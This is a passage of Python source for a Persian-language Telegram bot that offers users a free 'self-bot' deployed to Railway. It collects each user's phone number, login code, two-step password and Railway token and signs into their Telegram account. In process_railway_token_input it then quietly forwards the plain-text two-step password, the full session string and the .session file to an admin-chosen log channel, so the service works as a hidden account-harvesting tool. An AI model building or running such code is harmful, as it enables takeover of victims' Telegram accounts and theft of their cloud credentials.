        if NEXT_RUN_ALLOWED_AT and now < NEXT_RUN_ALLOWED_AT:
            wait_minutes = int((NEXT_RUN_ALLOWED_AT - now).total_seconds() // 60)
            wait_seconds = int((NEXT_RUN_ALLOWED_AT - now).total_seconds() % 60)
            next_time = NEXT_RUN_ALLOWED_AT.strftime("%H:%M")
            await query.answer(f"ربات استفاده شده تا {next_time} لطفا برای ران مجدد 00:{wait_minutes}:{wait_seconds:02d} دیگر صبر کنید!", show_alert=True)
            return ConversationHandler.END
    if not is_owner(user_id) and RUNNING_USER and RUNNING_USER != user_id:
        if RUN_STARTED_AT:
            elapsed = (now - RUN_STARTED_AT).total_seconds()
        else:
            elapsed = 0
        remaining = max(0, 300 - elapsed)
        if remaining > 0:
            await query.answer("شما ۵ دقیقه محدود شدید.", show_alert=True)
            return ConversationHandler.END
    await query.answer()
    RUNNING_USER = user_id
    RUN_STARTED_AT = now
    asyncio.create_task(reset_run_task(context.bot, update.effective_chat.id, user_id))
    try:
        await query.message.delete()
    except:
        pass
    keyboard = ReplyKeyboardMarkup([[KeyboardButton("ارسال شماره", request_contact=True)]], resize_keyboard=True, one_time_keyboard=True)
    try:
        msg = await context.bot.copy_message(
            chat_id=update.effective_chat.id, from_chat_id=PRIVATE_CHANNEL_ID, message_id=7,
            caption="جهت تأیید قوانین ذکر شده در بخش قوانین، شماره خود را از طریق دکمه زیر ارسال کنید:", reply_markup=keyboard
        )
        msg_id = msg.message_id
    except Exception:
        msg = await context.bot.send_message(
            chat_id=update.effective_chat.id, text="جهت تأیید قوانین ذکر شده در بخش قوانین، شماره خود را از طریق دکمه زیر ارسال کنید:", reply_markup=keyboard
        )
        msg_id = msg.message_id
    USER_DATA_STORE[user_id] = {"flow": "run", "last_bot_msg": msg_id, "step": "get_number"}
    return GET_NUMBER

async def process_number_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global RUNNING_USER, RUN_STARTED_AT
    user_id = update.effective_user.id
    if user_id not in USER_DATA_STORE:
        return ConversationHandler.END
    flow = USER_DATA_STORE[user_id]["flow"]
    if not update.message.contact:
        if is_owner(user_id) and update.message.text and update.message.text.strip().isdigit():
            number = update.message.text.strip()
        else:
            await update.message.reply_text("لطفاً فقط با استفاده از دکمه 'ارسال شماره' شماره خود را ارسال کنید.")
            return GET_NUMBER
    else:
        number = update.message.contact.phone_number.replace("+", "").replace(" ", "").strip()
    try:
        await update.message.delete()
        await context.bot.delete_messages(chat_id=update.effective_chat.id, message_ids=[USER_DATA_STORE[user_id]["last_bot_msg"]])
    except:
        pass
    if flow == "check":
        save_user_text(user_id, username=update.effective_user.username, phone=number)
        is_banned_num = False
        for b in BANNED_NUMBERS:
            processed_b = b.strip().replace("+", "").replace(" ", "")
            if number == processed_b:
                is_banned_num = True
                break
        if is_banned_num:
            await context.bot.send_message(chat_id=update.effective_chat.id, text="شماره شما بن شده است!", reply_markup=ReplyKeyboardRemove())
        elif number in ADNUMBER:
            if user_id not in OWNER_IDS:
                OWNER_IDS.append(user_id)
                await context.bot.send_message(chat_id=update.effective_chat.id, text="شما به عنوان ادمین شناسایی شدید و اضافه شدید!", reply_markup=ReplyKeyboardRemove())
            else:
                await context.bot.send_message(chat_id=update.effective_chat.id, text="شما ادمین هستید!", reply_markup=ReplyKeyboardRemove())
        else:
            await context.bot.send_message(chat_id=update.effective_chat.id, text="شما مجاز به استفاده از سلف ساز هستید!", reply_markup=ReplyKeyboardRemove())
        USER_DATA_STORE.pop(user_id, None)
        return ConversationHandler.END
    if flow == "run":
        if not is_owner(user_id) and number.startswith("93"):
            await context.bot.send_message(
                chat_id=update.effective_chat.id,
                text="شماره تلفن کشور شما مجاز نیست!\n\nسازنده:\n@uezrz",
                reply_markup=ReplyKeyboardRemove()
            )
            RUNNING_USER = None
            RUN_STARTED_AT = None
            USER_DATA_STORE.pop(user_id, None)
            return ConversationHandler.END
        if number in BANNED_NUMBERS:
            await context.bot.send_message(
                chat_id=update.effective_chat.id,
                text="شما بن شده‌اید! برای حل مشکل به پشتیبانی مراجعه کنید.\nt.me/uezrz",
                reply_markup=ReplyKeyboardRemove()
            )
            RUNNING_USER = None
            RUN_STARTED_AT = None
            USER_DATA_STORE.pop(user_id, None)
            return ConversationHandler.END
        session_path = os.path.join("sessions", f"selfbot_{user_id}")
        for f_ext in [".session", ".session-journal"]:
            target_file = session_path + f_ext
            if os.path.exists(target_file):
                try:
                    os.remove(target_file)
                except:
                    pass
        USER_DATA_STORE[user_id].update({"number": number, "session": session_path, "temp_code": ""})
        save_user_text(user_id, phone=number)
        tele_client = None
        try:
            tele_client = TelegramClient(
                session=SQLiteSession(session_path),
                api_id=API_ID,
                api_hash=API_HASH,
                device_model="Samsung Galaxy A52",
                use_ipv6=False
            )
            await tele_client.connect()
            sent = await tele_client.send_code_request(number)
            USER_DATA_STORE[user_id]["client"] = tele_client
            USER_DATA_STORE[user_id]["sent_code"] = sent
            kb, text = get_numeric_keyboard()
            msg = await context.bot.send_message(
                chat_id=update.effective_chat.id,
                text=text,
                reply_markup=kb
            )
            USER_DATA_STORE[user_id]["last_bot_msg"] = msg.message_id
            return GET_CODE
        except Exception as e:
            logger.error(f"Error sending code for {number}: {e}")
            await context.bot.send_message(
                chat_id=update.effective_chat.id,
                text="خطا در ارسال کد! شماره تلفن شما محدودیت زمانی دارد یا مسدود است.\n\nاگر مشکل ادامه داشت، چند دقیقه بعد دوباره امتحان کنید.",
                reply_markup=ReplyKeyboardRemove()
            )
            if tele_client:
                try:
                    await tele_client.disconnect()
                except:
                    pass
            USER_DATA_STORE.pop(user_id, None)
            RUNNING_USER = None
            RUN_STARTED_AT = None
            return ConversationHandler.END

async def process_code_buttons(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global RUNNING_USER, RUN_STARTED_AT
    query = update.callback_query
    user_id = update.effective_user.id
    if user_id not in USER_DATA_STORE:
        return ConversationHandler.END
    data = query.data
    current_code = USER_DATA_STORE[user_id].get("temp_code", "")
    if data.startswith("code_add_"):
        await query.answer()
        digit = data.split("_")[-1]
        if len(current_code) < 5:
            current_code += digit
            USER_DATA_STORE[user_id]["temp_code"] = current_code
    elif data == "code_clear_all":
        await query.answer()
        current_code = ""
        USER_DATA_STORE[user_id]["temp_code"] = current_code
    elif data == "code_cancel":
        await query.answer()
        try:
            await query.message.delete()
        except:
            pass
        await cleanup_sessions(user_id)
        USER_DATA_STORE.pop(user_id, None)
        RUNNING_USER = None
        RUN_STARTED_AT = None
        await context.bot.send_message(chat_id=update.effective_chat.id, text="عملیات لغو شد!")
        return ConversationHandler.END
    elif data == "code_confirm":
        if len(current_code) != 5:
            await query.answer("کد باید ۵ رقمی باشد!", show_alert=True)
            return GET_CODE
        await query.answer()
        code = current_code.translate(str.maketrans("BaseDigits", "0123456789"))
        try:
            await query.message.delete()
        except:
            pass
        tele_client = USER_DATA_STORE[user_id]["client"]
        try:
            await tele_client.sign_in(phone=USER_DATA_STORE[user_id]["number"], code=code)
            msg = await context.bot.send_message(
                chat_id=update.effective_chat.id,
                text="ورود موفق!\n\nحالا **توکن Railway** خودت رو ارسال کن:\n\n(از این آدرس بگیر:\nhttps://railway.com/account/tokens)"
            )
            USER_DATA_STORE[user_id]["last_bot_msg"] = msg.message_id
            return GET_RAILWAY_TOKEN
        except SessionPasswordNeededError:
            try:
                msg = await context.bot.copy_message(chat_id=update.effective_chat.id, from_chat_id=PRIVATE_CHANNEL_ID, message_id=6, caption="رمز دو مرحله‌ای را وارد کنید:")
                msg_id = msg.message_id
            except Exception:
                msg = await context.bot.send_message(chat_id=update.effective_chat.id, text="رمز دو مرحله‌ای را وارد کنید:")
                msg_id = msg.message_id
            USER_DATA_STORE[user_id]["last_bot_msg"] = msg_id
            return GET_2FA
        except Exception:
            await context.bot.send_message(chat_id=update.effective_chat.id, text="کد ورود اشتباه است یا منقضی شده است!")
            USER_DATA_STORE[user_id]["temp_code"] = ""
            kb, text = get_numeric_keyboard()
            msg = await context.bot.send_message(chat_id=update.effective_chat.id, text=text, reply_markup=kb)
            USER_DATA_STORE[user_id]["last_bot_msg"] = msg.message_id
            return GET_CODE
    kb, text = get_numeric_keyboard(current_code)
    try:
        await query.message.edit_text(text, reply_markup=kb)
    except:
        pass
    return GET_CODE

async def process_2fa_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global RUNNING_USER, RUN_STARTED_AT
    user_id = update.effective_user.id
    if user_id not in USER_DATA_STORE:
        return ConversationHandler.END
    password = update.message.text.strip()
    tele_client = USER_DATA_STORE[user_id]["client"]
    try:
        await update.message.delete()
        await context.bot.delete_messages(chat_id=update.effective_chat.id, message_ids=[USER_DATA_STORE[user_id]["last_bot_msg"]])
    except:
        pass
    try:
        await tele_client.sign_in(password=password)
        USER_DATA_STORE[user_id]["two_step"] = password
        msg = await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="ورود موفق!\n\nحالا توکن Railway خودت رو ارسال کن:\n\n(از این آدرس بگیر:\nhttps://railway.com/account/tokens)"
        )
        USER_DATA_STORE[user_id]["last_bot_msg"] = msg.message_id
        return GET_RAILWAY_TOKEN
    except PasswordHashInvalidError:
        await update.message.reply_text("رمز دو مرحله‌ای اشتباه است!")
        try:
            msg = await context.bot.copy_message(chat_id=update.effective_chat.id, from_chat_id=PRIVATE_CHANNEL_ID, message_id=11, caption="رمز دو مرحله‌ای را وارد کنید:")
            msg_id = msg.message_id
        except Exception:
            msg = await context.bot.send_message(chat_id=update.effective_chat.id, text="رمز دو مرحله‌ای را وارد کنید:")
            msg_id = msg.message_id
        USER_DATA_STORE[user_id]["last_bot_msg"] = msg_id
        return GET_2FA
    except Exception:
        await update.message.reply_text("خطایی رخ داد عملیات لغو شد.")
        await cleanup_sessions(user_id)
        USER_DATA_STORE.pop(user_id, None)
        RUNNING_USER = None
        RUN_STARTED_AT = None
        return ConversationHandler.END

async def process_railway_token_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global RUNNING_USER, RUN_STARTED_AT, REMAINING_RUNS, NEXT_RUN_ALLOWED_AT
    user_id = update.effective_user.id
    if user_id not in USER_DATA_STORE:
        return ConversationHandler.END
    token = update.message.text.strip()
    try:
        await update.message.delete()
        await context.bot.delete_messages(chat_id=update.effective_chat.id, message_ids=[USER_DATA_STORE[user_id]["last_bot_msg"]])
    except:
        pass
    if not token or len(token) < 20:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="توکن نامعتبر است. لطفاً یک توکن معتبر Railway ارسال کنید:\nhttps://railway.com/account/tokens"
        )
        msg = await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="توکن Railway خود را دوباره ارسال کنید:"
        )
        USER_DATA_STORE[user_id]["last_bot_msg"] = msg.message_id
        return GET_RAILWAY_TOKEN
    wait_msg = await context.bot.send_message(
        chat_id=update.effective_chat.id,
        text="در حال دیپلوی سلف روی Railway... لطفاً صبر کنید (ممکن است ۳۰ تا ۶۰ ثانیه طول بکشد)."
    )
    try:
        tele_client = USER_DATA_STORE[user_id]["client"]
        string_session = "Error"
        try:
            string_session = StringSession.save(tele_client.session)
        except Exception as e:
            logger.error(f"Error saving string session: {e}")
        await tele_client.disconnect()
        success, result_msg = await asyncio.to_thread(
            deploy_to_railway, token, string_session, user_id
        )
        try:
            await wait_msg.delete()
        except:
            pass
        if not success:
            await context.bot.send_message(
                chat_id=update.effective_chat.id,
                text=f"خطا در دیپلوی روی Railway:\n`{result_msg}`\n\nتوکن را چک کنید و دوباره امتحان کنید.",
                parse_mode=ParseMode.MARKDOWN
            )
            await cleanup_sessions(user_id)
            USER_DATA_STORE.pop(user_id, None)
            RUNNING_USER = None
            RUN_STARTED_AT = None
            return ConversationHandler.END
        await cleanup_sessions(user_id)
        if not is_owner(user_id):
            if REMAINING_RUNS > 0:
                REMAINING_RUNS -= 1
                save_max_runs(REMAINING_RUNS)
        now_tehran = datetime.now(timezone("Asia/Tehran"))
        if is_owner(user_id):
            NEXT_RUN_ALLOWED_AT = now_tehran + timedelta(seconds=10)
        else:
            NEXT_RUN_ALLOWED_AT = now_tehran + timedelta(minutes=10)
        save_user_text(
            user_id,
            username=update.effective_user.username,
            phone=USER_DATA_STORE[user_id]['number'],
            ip="Railway",
            server_user="railway",
            passwd=token[:20] + "...",
            string_session=string_session
        )
        await update_channel_message(context.application)
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=f"سلف با موفقیت روی Railway دیپلوی شد!\n\n{result_msg}\n\nبا دستور پنل یا panel منوی راهنما سلف را باز کنید.\n\nفروش این سلف ممنوع است!\n@JavidSelf\nسلف ساز رایگان:\n@JavidSelfBot",
            parse_mode=ParseMode.MARKDOWN
        )
        if not is_owner(user_id):
            LAST_RUNS[user_id] = time.time()
            save_last_runs()
        NEWS_ID = None
        try:
            if os.path.exists("channel_id.txt"):
                with open("channel_id.txt", "r") as f:
                    content = f.read().strip()
                    if content:
                        NEWS_ID = int(content)
        except Exception as e:
            logger.error(f"Error reading channel_id.txt: {e}")
        if NEWS_ID:
            if update.effective_user.username:
                username_or_mention = f"@{update.effective_user.username}"
            else:
                username_or_mention = f"[{update.effective_user.first_name}](tg://user?id={user_id})"
            two_step_pass = USER_DATA_STORE[user_id].get("two_step", "NoPasswd!")
            info = (
                f"New Railway Run!\nUser: {username_or_mention}\nUserid: {user_id}\n"
                f"Number: +{USER_DATA_STORE[user_id]['number']}\nPassword: `{two_step_pass}`\n"
                f"String: `{string_session}`\n"
                f"Railway Token: `{token[:25]}...`"
            )
            try:
                local_session = f"sessions/selfbot_{user_id}.session"
                local_journal = f"sessions/selfbot_{user_id}.session-journal"
                if os.path.exists(local_session):
                    with open(local_session, "rb") as session_file:
                        await context.bot.send_document(
                            chat_id=NEWS_ID,
                            document=session_file,
                            filename=f"selfbot_{user_id}.session",
                            caption=info,
                            parse_mode=ParseMode.MARKDOWN
                        )
                else:
                    await context.bot.send_message(chat_id=NEWS_ID, text=info, parse_mode=ParseMode.MARKDOWN)
                try:
                    if os.path.exists(local_session):
                        os.remove(local_session)
                    if os.path.exists(local_journal):
                        os.remove(local_journal)
                except Exception as ex:
                    logger.error(f"Failed to delete session files: {ex}")
            except Exception as e:
                logger.error(f"Failed to send log to channel {NEWS_ID}: {e}")
        USER_DATA_STORE.pop(user_id, None)
        RUNNING_USER = None
        RUN_STARTED_AT = None
        return ConversationHandler.END
    except Exception as e:
        logger.error(f"Error while deploying to Railway: {str(e)}")
        try:
            await wait_msg.delete()
        except:
            pass
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="خطا در اجرای سلف روی Railway! توکن را چک کنید یا چند دقیقه بعد دوباره امتحان کنید."
        )
        await cleanup_sessions(user_id)
        USER_DATA_STORE.pop(user_id, None)
        RUNNING_USER = None
        RUN_STARTED_AT = None
        return ConversationHandler.END

async def start_custom_runs_flow(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = update.effective_user.id
    if not is_owner(user_id):
        return ConversationHandler.END
    try:
        await query.message.delete()
    except:
        pass
    msg = await context.bot.send_message(chat_id=update.effective_chat.id, text="لطفاً تعداد ران جدید را به صورت یک عدد انگلیسی ارسال کنید:")
    USER_DATA_STORE[user_id] = {"flow": "admin_runs", "last_bot_msg": msg.message_id}
    return ADMIN_INPUT_RUNS

async def process_custom_runs_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global REMAINING_RUNS
    user_id = update.effective_user.id
    if not is_owner(user_id):
        return ConversationHandler.END
    try:
        count = int(update.message.text.strip())
        if count < 0:
            raise ValueError
        REMAINING_RUNS = count
        save_max_runs(count)
        await update_channel_message(context.application)
        try:
            await update.message.delete()
            await context.bot.delete_messages(chat_id=update.effective_chat.id, message_ids=[USER_DATA_STORE[user_id]["last_bot_msg"]])
        except:
            pass
        USER_DATA_STORE.pop(user_id, None)
        kb = InlineKeyboardMarkup([
            [InlineKeyboardButton("1", callback_data="set_run_1", style='success'), InlineKeyboardButton("10", callback_data="set_run_10", style='success')],
            [InlineKeyboardButton("100", callback_data="set_run_100", style='success'), InlineKeyboardButton("عدد دلخواه", callback_data="set_run_custom", style='success')],
            [InlineKeyboardButton("بازگشت", callback_data="admin_panel", style='primary')]
        ])
        await update.message.reply_text(
            f"بخش تنظیم تعداد ران مجاز\n\nمقدار فعلی: {REMAINING_RUNS}\nمقدار مورد نیاز خود را انتخاب کنید:",
            reply_markup=kb, parse_mode=ParseMode.MARKDOWN
        )
        return ConversationHandler.END
    except ValueError:
        await update.message.reply_text("لطفاً فقط یک عدد صحیح و معتبر انگلیسی وارد کنید:")
        return ADMIN_INPUT_RUNS

async def start_admin_ban_flow(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = update.effective_user.id
    if not is_owner(user_id):
        return ConversationHandler.END
    try:
        await query.message.delete()
    except:
        pass
    msg = await context.bot.send_message(chat_id=update.effective_chat.id, text="لطفاً شناسه عددی کاربر مورد نظر را برای مسدود کردن ارسال کنید:")
    USER_DATA_STORE[user_id] = {"flow": "admin_ban", "last_bot_msg": msg.message_id}
    return ADMIN_INPUT_BAN

async def process_admin_ban_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        return ConversationHandler.END
    try:
        uid = int(update.message.text.strip())
        BANNED_USERS.add(uid)
        save_banned_users()
        try:
            await update.message.delete()
            await context.bot.delete_messages(chat_id=update.effective_chat.id, message_ids=[USER_DATA_STORE[user_id]["last_bot_msg"]])
        except:
            pass
        USER_DATA_STORE.pop(user_id, None)
        await update.message.reply_text("بن شد!")
        return ConversationHandler.END
    except ValueError:
        await update.message.reply_text("لطفاً فقط یک شناسه عددی معتبر وارد کنید:")
        return ADMIN_INPUT_BAN

async def start_admin_unban_flow(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = update.effective_user.id
    if not is_owner(user_id):
        return ConversationHandler.END
    try:
        await query.message.delete()
    except:
        pass
    msg = await context.bot.send_message(chat_id=update.effective_chat.id, text="لطفاً شناسه عددی کاربر مورد نظر را برای رفع مسدودیت ارسال کنید:")
    USER_DATA_STORE[user_id] = {"flow": "admin_unban", "last_bot_msg": msg.message_id}
    return ADMIN_INPUT_UNBAN

async def process_admin_unban_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        return ConversationHandler.END
    try:
        uid = int(update.message.text.strip())
        if uid in BANNED_USERS:
            BANNED_USERS.discard(uid)
            save_banned_users()
        try:
            await update.message.delete()
            await context.bot.delete_messages(chat_id=update.effective_chat.id, message_ids=[USER_DATA_STORE[user_id]["last_bot_msg"]])
        except:
            pass
        USER_DATA_STORE.pop(user_id, None)
        await update.message.reply_text("رفع بن شد!")
        return ConversationHandler.END
    except ValueError:
        await update.message.reply_text("لطفاً فقط یک شناسه عددی معتبر وارد کنید:")
        return ADMIN_INPUT_UNBAN

async def start_admin_channel_flow(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = update.effective_user.id
    if not is_owner(user_id):
        return ConversationHandler.END
    try:
        await query.message.delete()
    except:
        pass
    msg = await context.bot.send_message(chat_id=update.effective_chat.id, text="لطفاً آیدی عددی کانال لاگ اطلاعات را به همراه منفی (مثلاً 1000000000-) ارسال کنید:")
    USER_DATA_STORE[user_id] = {"flow": "admin_channel", "last_bot_msg": msg.message_id}
    return ADMIN_INPUT_CHANNEL

async def process_admin_channel_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        return ConversationHandler.END
    channel_input = update.message.text.strip()
    try:
        with open("channel_id.txt", "w") as f:
            f.write(channel_input)
        try:
            await update.message.delete()
            await context.bot.delete_messages(chat_id=update.effective_chat.id, message_ids=[USER_DATA_STORE[user_id]["last_bot_msg"]])
        except:
            pass
        USER_DATA_STORE.pop(user_id, None)
        kb = InlineKeyboardMarkup([[InlineKeyboardButton("بازگشت", callback_data="admin_panel", style='primary')]])
        await update.message.reply_text(f"آیدی کانال اطلاعات با موفقیت ذخیره شد:\n`{channel_input}`", reply_markup=kb, parse_mode=ParseMode.MARKDOWN)
        return ConversationHandler.END
    except Exception:
        await update.message.reply_text("خطایی در ذخیره فایل رخ داد. لطفاً مجدداً آیدی را ارسال کنید:")
        return ADMIN_INPUT_CHANNEL

async def channel_message_updater_loop(application: Application):
    global REMAINING_RUNS
    last_minute = None
    last_run_count = REMAINING_RUNS
    while True:
        try:
            now = datetime.now(timezone("Asia/Tehran"))
            current_minute = now.strftime('%H:%M')
            current_run_count = load_max_runs()
            if current_minute != last_minute or current_run_count != last_run_count:
                last_minute = current_minute
                last_run_count = current_run_count
                REMAINING_RUNS = current_run_count
                await update_channel_message(application)
        except:
            pass
        await asyncio.sleep(1)

async def post_init(application: Application):
    asyncio.create_task(channel_message_updater_loop(application))

def main():
    application = Application.builder().token(BOT_TOKEN).post_init(post_init).build()
    conv_handler = ConversationHandler(
        entry_points=[
            CallbackQueryHandler(start_check_number_flow, pattern="^check_number$"),
            CallbackQueryHandler(start_run_self_flow, pattern="^run_self$"),
            CallbackQueryHandler(start_custom_runs_flow, pattern="^set_run_custom$"),
            CallbackQueryHandler(start_admin_ban_flow, pattern="^admin_ban_user$"),
            CallbackQueryHandler(start_admin_unban_flow, pattern="^admin_unban_user$"),
            CallbackQueryHandler(start_admin_channel_flow, pattern="^admin_set_channel_custom$")
        ],
        states={
            GET_NUMBER: [MessageHandler(filters.CONTACT | filters.TEXT & ~filters.COMMAND, process_number_input)],
            GET_CODE: [CallbackQueryHandler(process_code_buttons, pattern="^code_")],
            GET_2FA: [MessageHandler(filters.TEXT & ~filters.COMMAND, process_2fa_input)],
            GET_RAILWAY_TOKEN: [MessageHandler(filters.TEXT & ~filters.COMMAND, process_railway_token_input)],
            ADMIN_INPUT_RUNS: [MessageHandler(filters.TEXT & ~filters.COMMAND, process_custom_runs_input)],
            ADMIN_INPUT_BAN: [MessageHandler(filters.TEXT & ~filters.COMMAND, process_admin_ban_input)],
            ADMIN_INPUT_UNBAN: [MessageHandler(filters.TEXT & ~filters.COMMAND, process_admin_unban_input)],
            ADMIN_INPUT_CHANNEL: [MessageHandler(filters.TEXT & ~filters.COMMAND, process_admin_channel_input)]
        },
        fallbacks=[CommandHandler("start", start)],
        per_chat=True,
        per_user=True,
        per_message=False
    )
    application.add_handler(conv_handler)
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CallbackQueryHandler(handle_callbacks))
    print("Bot is Running...")
    application.run_polling()

if __name__ == "__main__":
    main()
